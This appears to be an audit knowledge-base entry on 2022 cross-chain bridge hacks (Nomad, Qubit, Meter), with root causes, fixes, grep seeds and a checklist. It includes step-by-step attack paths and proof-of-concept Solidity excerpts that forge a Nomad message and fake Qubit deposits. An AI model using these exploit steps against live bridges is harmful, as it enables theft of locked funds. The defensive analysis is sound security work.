---
# Core Classification
protocol: generic
chain: ethereum, bsc, moonriver
category: bridge
vulnerability_type: bridge_verification_bypass

# Pattern Identity
root_cause_family: missing_validation
pattern_key: missing_proof_validation | bridge_message_handler | deposit_or_process | fund_loss

# Interaction Scope
interaction_scope: cross_chain
involved_contracts:
  - Replica
  - BridgeRouter
  - QBridge
  - QBridgeHandler
  - MeterBridgeHandler
path_keys:
  - zero_hash_trusted_root | Replica.process | Replica -> BridgeRouter.handle
  - address_zero_whitelist | QBridge.deposit | QBridge -> QBridgeHandler.deposit
  - native_wrapping_bypass | MeterBridgeHandler.deposit | depositHandler -> WETH

# Attack Vector Details
attack_type: logical_error
affected_component: message_verification, deposit_validation, cross_chain_relay

# Technical Primitives
primitives:
  - merkle_root
  - message_proof
  - zero_hash
  - address_zero
  - msg_value_validation
  - native_token_wrapping
  - cross_chain_relay
  - deposit_handler
  - confirmAt
  - resourceID

# Grep / Hunt-Card Seeds
code_keywords:
  - confirmAt
  - process
  - messages
  - MessageStatus
  - acceptableRoot
  - bytes32(0)
  - resourceID
  - resourceIDToTokenContractAddress
  - contractWhitelist
  - msg.value
  - deposit
  - IWETH
  - safeTransferFrom

# Impact Classification
severity: critical
impact: fund_loss
exploitability: 0.8
financial_impact: critical

# Context Tags
tags:
  - bridge
  - cross-chain
  - verification
  - message_passing
  - native_token
  - deposit
  - relay
  - DeFiHackLabs

# Version Info
language: solidity
version: ">=0.8.0"
---

## References & Source Reports

| Label | Source | Path / URL | Severity | Loss |
|-------|--------|------------|----------|------|
| [NOM-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-08/NomadBridge_exp.sol` | CRITICAL | $190M |
| [QUB-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-01/Qubit_exp.sol` | CRITICAL | $80M |
| [MET-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-02/Meter_exp.sol` | CRITICAL | $4.4M |

---

# Bridge Verification Bypass Attack Patterns (2022)

## Overview

Cross-chain bridge exploits in 2022 resulted in over **$274M** in losses by exploiting fundamental flaws in message verification, deposit validation, and native token handling. Three patterns: (1) faulty initialization enabling zero-hash proof bypass (Nomad $190M), (2) native token deposit fakery via `address(0)` whitelisting without `msg.value` validation (Qubit $80M), and (3) native/ERC20 token wrapping inconsistencies in deposit handlers (Meter $4.4M). A single verification bypass exposes the entire bridge's locked liquidity across all token types.

### Agent Quick View

- Root cause statement: "This vulnerability exists because bridge message verification allows zero-hash proofs to pass as trusted (Nomad), deposit handlers accept address(0) tokens without msg.value validation (Qubit), or native/ERC20 deposit paths don't enforce msg.value consistency (Meter)."
- Pattern key: `missing_proof_validation | bridge_message_handler | deposit_or_process | fund_loss`
- Interaction scope: `cross_chain`
- Primary affected component(s): `message proof verification, deposit handler, native token wrapping`
- Contracts / modules involved: `Replica, BridgeRouter, QBridge, QBridgeHandler, MeterBridgeHandler`
- Path keys: `zero_hash_trusted_root | Replica.process | Replica -> BridgeRouter.handle`; `address_zero_whitelist | QBridge.deposit | QBridge -> QBridgeHandler.deposit`; `native_wrapping_bypass | MeterBridgeHandler.deposit | depositHandler -> WETH`
- High-signal code keywords: `confirmAt, bytes32(0), messages, process, resourceID, contractWhitelist, msg.value, deposit`
- Typical sink / impact: `complete bridge drain, unlimited wrapped token minting, deposit event spoofing`
- Validation strength: `strong`

### Contract / Boundary Map

- Entry surface(s): `Replica.process()`, `QBridge.deposit()`, `MeterBridgeHandler.deposit()`
- Contract hop(s): `Replica.process -> BridgeRouter.handle -> ERC20.transfer`; `QBridge.deposit -> QBridgeHandler.deposit -> Deposit event -> relayer minting`
- Trust boundary crossed: `message proof verification → token release`; `deposit event emission → cross-chain relayer → destination chain minting`
- Shared state or sync assumption: `confirmAt[root] must only be non-zero for legitimately proven roots`; `deposit amount must match actual token transfer or msg.value`

### Valid Bug Signals

- Signal 1: Trusted root initialized to `bytes32(0)` or re-initializable — unproven messages default to zero root which then passes
- Signal 2: `address(0)` is in `contractWhitelist` AND deposit handler does not enforce `msg.value` for native token path
- Signal 3: Native token deposit path takes `amount` from calldata instead of `msg.value`
- Signal 4: Bridge initializer can be called more than once or sets security-critical state to zero/default

### False Positive Guards

- Not this bug when: Trusted root is initialized to a non-trivial hash AND unproven messages explicitly revert
- Safe if: Native token deposits enforce `require(msg.value == amount)` and `address(0)` is not whitelisted
- Safe if: Replay protection tracks processed message hashes and rejects duplicates
- Requires attacker control of: Ability to submit messages to `process()` or call `deposit()` — both are public functions

---

## Vulnerability Description

### Root Cause

Three variations of missing validation in bridge verification:

1. **Zero-hash trusted root (Nomad)**: During a routine upgrade the Replica contract was initialized with `confirmAt[bytes32(0)]` set to non-zero (trusted). Since any unproven message defaults to `messages[hash] = bytes32(0)`, ALL arbitrary messages pass verification. Attackers copy a legitimate bridge transaction, replace the recipient, and call `process()`.

2. **address(0) whitelisting without msg.value (Qubit)**: The QBridge mapped the ETH `resourceID` to `address(0)` in the deposit handler, and `address(0)` was whitelisted. The `deposit()` function did not check `msg.value`, so attackers could encode arbitrary ETH amounts in calldata without sending any ETH. The relayer credited the fake amount on BSC.

3. **Native token wrapping bypass (Meter)**: A Chainbridge fork deposit handler has separate logic for ERC20 (calls `transferFrom`) and native tokens (should wrap `msg.value`). The native deposit path reads `amount` from calldata instead of enforcing `msg.value == amount`, allowing fabricated deposit amounts.

### Attack Scenario / Path Variants

**Path A: Zero-Hash Trusted Root — Message Proof Bypass (Nomad — $190M)** [CRITICAL]
Path key: `zero_hash_trusted_root | Replica.process | Replica -> BridgeRouter.handle`
Entry surface: `Replica.process(bytes memory _message)` — callable by anyone
Contracts touched: `Replica -> BridgeRouter.handle -> ERC20.transfer`
Boundary crossed: `message proof verification → token release`
pathShape: `atomic`

1. Find a legitimate past bridge transaction (e.g., 100 WBTC transfer from Moonbeam → Ethereum)
2. Copy the raw message bytes from the transaction calldata
3. Replace the recipient address field with attacker's address
4. Call `Replica.process(modifiedMessage)` — message hash is unknown → `messages[hash] = bytes32(0)` → `confirmAt[bytes32(0)] != 0` → TRUSTED
5. BridgeRouter.handle() releases 100 WBTC to attacker
6. Repeat for any token and any amount — the zero hash makes ALL messages valid
7. **This was a free-for-all**: hundreds of different addresses replayed the exploit, draining $190M total

**Path B: Native Token Deposit Fakery via address(0) (Qubit — $80M)** [CRITICAL]
Path key: `address_zero_whitelist | QBridge.deposit | QBridge -> QBridgeHandler.deposit`
Entry surface: `QBridge.deposit(uint8 destDomainID, bytes32 resourceID, bytes data)` — callable by anyone
Contracts touched: `QBridge.deposit -> QBridgeHandler.deposit -> Deposit event`
Boundary crossed: `deposit event on Ethereum → relayer → minting on BSC`
pathShape: `staged`

Setup (staging):
1. Identify that `resourceID` for ETH resolves to `address(0)` via `resourceIDToTokenContractAddress`
2. Confirm `address(0)` is whitelisted in `contractWhitelist`

Firing:
3. Call `QBridge.deposit(1, ethResourceID, encodedData)` with `msg.value = 0` — encodes 3,077 ETH in calldata
4. deposit() succeeds — no `msg.value` check for native token deposits
5. Deposit event emitted on Ethereum → BSC relayers credit 3,077 qXETH
6. Repeat to accumulate 77,162 qXETH → borrow all Qubit lending assets (~$80M)

**Path C: Native Token Wrapping Bypass (Meter — $4.4M)** [CRITICAL]
Path key: `native_wrapping_bypass | MeterBridgeHandler.deposit | depositHandler -> WETH`
Entry surface: `MeterBridgeHandler.deposit()` — callable through the bridge
Contracts touched: `MeterBridgeHandler.deposit -> WETH.deposit (skipped or amount-mismatch)`
Boundary crossed: `deposit amount verification → cross-chain relay`
pathShape: `atomic`

1. Meter bridge handler branches on token type: ERC20 calls `transferFrom`, native should wrap `msg.value`
2. Native deposit path reads amount from calldata, NOT from `msg.value`
3. Attack: call deposit with native token flag, `msg.value = 0`, but encoded amount = fabricated value
4. Deposit event emitted with fabricated amount → relayers process on destination chain
5. Attacker receives wrapped native tokens on destination → swaps for real assets on Moonriver via SushiSwap

### Vulnerable Pattern Examples

**Example 1: Nomad Bridge — Zero-Hash Message Validation ($190M, August 2022)** [Approx Vulnerability: CRITICAL] `@audit` [NOM-POC]

```solidity
// ❌ VULNERABLE: Replica initialized with trusted root = 0x00
// Unproven messages default to bytes32(0) → passes verification

// Replica.process() flow:
// 1. _messageHash = keccak256(_message)
// 2. _root = messages[_messageHash]  → bytes32(0) for any new message
// 3. Check: confirmAt[_root] != 0   → confirmAt[0x00] was set to non-zero!
// 4. PASSES — message released

// PoC: Copy a legitimate WBTC bridge message, replace recipient
bytes memory msgP1 = hex"6265616d000000000000000000000000d3dfd3ede74e0dcebc1aa685e151332857efce2d"
                     hex"000013d60065746800000000000000000000000088a69b4e698a4b090df6cf5bd7b2d47325ad30a3"
                     hex"006574680000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c59903"
                     hex"000000000000000000000000";
bytes memory recvAddr = abi.encodePacked(address(this));  // @audit Replace recipient
bytes memory msgP2 = hex"00000000000000000000000000000000000000000000000000000002540be400"
                     hex"e6e85ded018819209cfb948d074cb65de145734b5b0852e4a5db25cac2b8c39a";

bytes memory _message = bytes.concat(msgP1, recvAddr, msgP2);
bool suc = Replica.process(_message);
// @audit Succeeds — 100 WBTC (02540be400 = 100 * 1e8) sent to attacker
// Replayed HUNDREDS of times by different addresses → $190M total

// Message structure:
// chainId: "beam" (Moonbeam)  |  recipient: BridgeRouter  |  token: WBTC
// _to: ATTACKER (replaced)   |  _amnt: 100 * 1e8
```

**Example 2: Qubit QBridge — Fake Native Deposit via address(0) ($80M, January 2022)** [Approx Vulnerability: CRITICAL] `@audit` [QUB-POC]

```solidity
// ❌ VULNERABLE: address(0) whitelisted + no msg.value validation for native deposits

bytes32 resourceID = hex"00000000000000000000002f422fe9ea622049d6f73f81a906b9b8cff03b7f01";

// Verify the vulnerability:
address resolved = IQBridgeHandler(QBridgeHandler).resourceIDToTokenContractAddress(resourceID);
// @audit resolved == address(0)
bool isWhitelisted = IQBridgeHandler(QBridgeHandler).contractWhitelist(address(0));
// @audit isWhitelisted == true

// Encoded deposit data: option=105, amount=3,077 ETH, recipient=attacker
bytes memory data = hex"00000000000000000000000000000000000000000000000000000000000000690"
                    hex"00000000000000000000000000000000000000000000a4cc799563c380000"
                    hex"000000000000000000000000d01ae1a708614948b2b5e0b7ab5be6afa01325c7";

// @audit deposit() succeeds with msg.value = 0!
IQBridge(QBridge).deposit(1, resourceID, data);
// Result: Deposit event for 3,077 ETH on Ethereum → BSC relayers credit 3,077 qXETH
// Repeat to accumulate 77,162 qXETH → borrow all Qubit lending assets (~$80M)
```

**Example 3: Meter Bridge — Native Token Wrapping Bypass ($4.4M, February 2022)** [Approx Vulnerability: CRITICAL] `@audit` [MET-POC]

```solidity
// ❌ VULNERABLE: Chainbridge fork deposit handler doesn't enforce msg.value
// for native token deposits — amount comes from calldata, not msg.value

// The Meter bridge handler has separate logic for:
// - ERC20 deposits: calls transferFrom(depositor, handler, amount)
// - Native deposits: should wrap msg.value into WETH/WBNB
// But native deposit path doesn't validate msg.value == amount!

// Attack: call deposit with native token flag, msg.value = 0, calldata amount = fabricated
// Deposit event emitted with fabricated amount → relayers process on Moonriver
// Attacker swaps received wrapped tokens on SushiSwap:
address[] memory path = new address[](2);
path[0] = 0x8d3d13cac607B7297Ff61A5E1E71072758AF4D01;
path[1] = 0x639A647fbe20b6c8ac19E48E2de44ea792c62c5C;
sushiSwapRouter.call(
    abi.encodeWithSignature(
        "swapExactTokensForTokens(uint256,uint256,address[],address,uint256)",
        2_000_000_000_000_000_000_000, 15_206_528_022_953_775_301,
        path, attackerAddress, 1_644_074_232
    )
);
```

---

## Impact Analysis

### Technical Impact
- Complete bridge liquidity drainage via message replay (Nomad: $190M from a single root initialization bug)
- Unlimited minting of wrapped tokens on destination chains without any backing
- Deposit event spoofing allows relayer exploitation without requiring attacker capital
- Once a bridge verification is bypassed, ALL locked assets across ALL token types are at risk

### Business Impact

| Protocol | Date | Loss | Root Cause |
|----------|------|------|------------|
| Nomad Bridge | Aug 2022 | $190M | Zero-hash trusted root — any message passes verification |
| Qubit QBridge | Jan 2022 | $80M | address(0) whitelisted, no msg.value check for native deposits |
| Meter Bridge | Feb 2022 | $4.4M | Chainbridge fork native/ERC20 deposit path inconsistency |

**Total: $274.4M** — Nomad was a "free-for-all" where hundreds of different addresses replayed the exploit.

### Affected Scenarios
- Message-passing bridges using merkle proof verification with initialization that could set zero hash as trusted
- Bridges with native token deposit handlers (ETH, BNB, MATIC wrapping) that don't enforce `msg.value`
- Chainbridge forks with ERC20/native token handler branching
- Bridges with `address(0)` or sentinel values in token whitelists
- Bridge upgrade/initialization flows that can set critical state to zero/default

---

## Secure Implementation

**Fix 1: Non-Zero Trusted Root Initialization**
```solidity
// ✅ SECURE: Never initialize trusted root to zero
contract SecureReplica {
    bytes32 public constant ZERO_HASH = bytes32(0);

    function initialize(bytes32 _committedRoot) external initializer {
        require(_committedRoot != ZERO_HASH, "Cannot use zero root");
        confirmAt[_committedRoot] = 1;
    }

    function process(bytes memory _message) external {
        bytes32 _messageHash = keccak256(_message);
        bytes32 _root = messages[_messageHash];
        require(_root != ZERO_HASH, "Message not proven");  // @audit Reject unproven
        require(acceptableRoot(_root), "Root not trusted");
        require(!processedMessages[_messageHash], "Already processed");  // @audit Replay protection
        processedMessages[_messageHash] = true;
        _handle(_message);
    }
}
```

**Fix 2: Strict msg.value Validation for Native Deposits**
```solidity
// ✅ SECURE: Enforce msg.value matches deposit amount for native tokens
contract SecureBridgeHandler {
    function deposit(
        bytes32 resourceID, uint256 amount, bytes calldata data
    ) external payable {
        address tokenAddress = resourceIDToToken[resourceID];

        if (tokenAddress == address(0) || tokenAddress == NATIVE_TOKEN) {
            require(msg.value == amount, "msg.value mismatch");  // @audit Strict match
            IWETH(weth).deposit{value: msg.value}();
        } else {
            require(msg.value == 0, "No ETH for ERC20 deposit");
            IERC20(tokenAddress).safeTransferFrom(msg.sender, address(this), amount);
        }

        require(amount > 0, "Zero amount");
        emit Deposit(resourceID, amount, msg.sender);
    }
}
```

**Fix 3: Message Uniqueness and Replay Protection**
```solidity
// ✅ SECURE: Track processed messages to prevent replay
contract SecureReplica {
    mapping(bytes32 => bool) public processedMessages;

    function process(bytes memory _message) external returns (bool) {
        bytes32 _messageHash = keccak256(_message);
        require(!processedMessages[_messageHash], "Already processed");
        processedMessages[_messageHash] = true;

        bytes32 _root = messages[_messageHash];
        require(_root != bytes32(0), "Not proven");
        require(acceptableRoot(_root), "Root not trusted");
        _handle(_message);
        return true;
    }
}
```

---

## Detection Patterns

### Contract / Call Graph Signals
```
- Bridge initializer that sets confirmAt[root] or similar trusted-root state — check what root value is used
- Deposit handler that branches on token address (native vs ERC20) without msg.value enforcement
- Token whitelist that includes address(0) or sentinel addresses
- Message processing that doesn't explicitly reject unproven messages (root == 0)
```

### High-Signal Grep Seeds
```
- confirmAt
- bytes32(0)
- messages[
- MessageStatus
- acceptableRoot
- resourceIDToTokenContractAddress
- contractWhitelist
- msg.value
- IWETH
- deposit.*payable
```

### Code Patterns to Look For
```
- Trusted root initialization to bytes32(0) or default values
- Message proof verification that passes for unproven messages (root defaults to zero)
- address(0) in token whitelists or resource ID mappings
- Native token deposit handlers where amount comes from calldata, not msg.value
- Missing replay protection (no processedMessages tracking)
- Bridge initializer callable multiple times (missing initializer guard)
```

### Audit Checklist
- [ ] Is the trusted root initialized to a non-zero, verified value?
- [ ] Can unproven messages (root = 0) pass verification?
- [ ] Is `address(0)` excluded from token whitelists?
- [ ] Does native token deposit enforce `msg.value == amount`?
- [ ] Is there replay protection for processed messages?
- [ ] Are deposit events only emitted after successful token transfer/wrap?
- [ ] Is the bridge initializer properly locked against re-initialization?

---

## Real-World Examples

### Known Exploits
- **Nomad Bridge** — Zero-hash trusted root, any message processes — Aug 2022 — $190M
  - Link: https://rekt.news/nomad-rekt/
  - Root cause: Upgrade initialized `confirmAt[0x00]` to trusted; unproven messages default to zero root
- **Qubit QBridge** — address(0) whitelisted, no msg.value check — Jan 2022 — $80M
  - Link: https://rekt.news/qubit-rekt/
  - Root cause: ETH `resourceID` → `address(0)` → whitelisted → fake deposits without sending ETH
- **Meter Bridge** — Native token wrapping bypass — Feb 2022 — $4.4M
  - Link: https://rekt.news/meter-rekt/
  - Root cause: Chainbridge fork mixed native/ERC20 deposit paths; amount from calldata, not msg.value

### Related Entries
- [Bridge Access Control Bypass (2021)](defihacklabs-bridge-patterns.md) — Poly Network, Chainswap
- [Bridge L2 & Cross-Chain Patterns (2022)](defihacklabs-bridge-l2-replay-2022-patterns.md) — Optimism, Harmony, Compound TUSD
- [LayerZero Bridge Vulnerabilities](../../bridge/layerzero/LAYERZERO_VULNERABILITIES.md)
- [Wormhole Bridge Vulnerabilities](../../bridge/wormhole/WORMHOLE_VULNERABILITIES.md)

---

## Prevention Guidelines

### Development Best Practices
1. Never initialize trusted roots to zero or default values — use a verified genesis root
2. Explicitly reject unproven messages: `require(root != 0, "not proven")`
3. Remove `address(0)` from all whitelists and resource mappings
4. Enforce strict `msg.value == amount` for native token deposits
5. Implement replay protection via processed message tracking
6. Use multi-party threshold signatures for relayer verification
7. Deploy monitoring and circuit-breaker mechanisms for anomalous bridge activity

### Testing Requirements
- Unit tests for: rejection of zero-root messages, msg.value enforcement on native deposits
- Integration tests for: re-initialization attacks, replay of processed messages
- Invariant tests for: total locked value on source chain >= total minted on destination
